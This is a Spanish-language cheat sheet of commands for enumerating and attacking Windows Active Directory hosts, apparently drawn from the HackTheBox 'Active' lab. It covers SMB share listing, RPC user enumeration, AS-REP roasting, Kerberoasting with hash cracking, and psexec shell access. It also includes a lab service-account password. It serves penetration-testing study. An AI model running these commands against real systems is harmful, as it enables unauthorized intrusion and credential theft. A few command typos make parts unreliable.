## Windows

El objetivo de esta página es documentar los comandos mas utilizados en enumeración y explotaciónde máquinas Windows.

### crackmapexek

Para ver info de un equipo sin credenciales:

<pre>
crackmapexec smb 10.10.10.100 
</pre>

Para ver recursos compartidos sin credenciales:

<pre>
  crackmapexec smb 10.10.10.100  --shares
</pre>

Para conectar con credenciales:

<pre>
  crackmapexec smb 10.10.10.100  -u 'usuario' -p 'password' --shares
</pre>

### smbmap

Para conectar a un host sin credenciales, nos lista unidades sin credenciales:

<pre>
smbmap -H 10.10.10.1000
</pre>

Para conectar ver lo que tiene un recurso, paramero -r:

<pre>
smbmap -H 10.10.10.1000 -r Replication
</pre>

Para descargarnos algo, parámetro --download

<pre>
smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
</pre>

Con credenciales:

<pre>
smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Groups
</pre>

### smbclient

Visualizar sin credenciales:

<pre>
smbclient -L //10.10.10.100/Replication -N

</pre>

### rpcclient

Una vez que tenemos credencales nos podemos conectar co  **rpcclient**:

<pre>
rpcclient -U "USUARIO%CONTRASEÑA" 10.10.10.100
</pre>

Tambien es posible a veces conectarse con sesion null:
<pre>
rpcclient -U "" 10.10.10.100 -N
</pre>

Con credenciales, listamos usuarios del dominio:
<pre>
rpcclient -U "USUARIO%CONTRASEÑA" 10.10.10.100 -c 'enumdomusers'
</pre>


Con credenciales, listamos grupos del dominio:
<pre>
rpcclient -U "USUARIO%CONTRASEÑA" 10.10.10.100 -c 'enumdomgroups'
</pre>


Con credenciales, usuarios de un grupo. Pasamos el id de grupo:
<pre>
rpcclient -U "USUARIO%CONTRASEÑA" 10.10.10.100 -c 'querygroupmem 0x200'
</pre>



Con credenciales, Info de un  usuario por su id:
<pre>
rpcclient -U "USUARIO%CONTRASEÑA" 10.10.10.100 -c 'queryguser 0x1f4'
</pre>

Con credenciales, ver las desripciones de todos los usuarios:
<pre>
rpcclient -U "USUARIO%CONTRASEÑA" 10.10.10.100 -c 'querygdispinfo'
</pre>

### rpcenum

Herramienta de s4vitar para enumerar usuarios y grupos de un dominio. Revisar m´áquina Active de HTB para ver como configurarla.

### ASREPRoast Attack

Cuando solo se dispone de usuarios, sin credenciales, **y estando en un entorno de active directory** se puede intentar un ASREPRoast Attack con GetNPUsers:
<pre>
GetNPUsers.py active.htb/ -no-pass -usersfile users.txt 
</pre>

### Kerbrute

Si está el puerto de kerberos aberto, el 88, se puede usar kerbrute para enumerar teniendo un diccionario.
<pre>
kerbrute userenum -dc 10.10.10.100 -d active.htb /usr/share/wordlists/SecList/Usernames/Names/names.txt
</pre>

### GetUsersSPNs

Si no es Kerberoasteable podemos usar esta opción para enumerar.

<pre>
GetUsersSPNs.py active.htb/USUARIO:CONTRASEÑA
</pre>

Si hay resultado se puede obtener un TGS, (Ticket Garanting Service). El hash se puede intentar romper con john


<pre>
GetUsersSPNs.py active.htb/USUARIO:CONTRASEÑA -request
</pre>


### PSEXEC

Si con **crackmapexec smb** nos aparece **Pwned** podemos obtener acceso con psexec:

<pre>
psexec.py active.htb/Administrator:CONTRASEÑA@10.10.10.100 cmd.exe
</pre>

## TRUCOS

### Sincronizar reloj

Para ataques ASREPRoast o kerbrute hay que sincronizar el reloj con el de la maquina active directory:

<pre>
ntpdate 10.10.10.100
</pre>

Con **date -s** podemos volver a dejar la fecha igual. Investigar como.
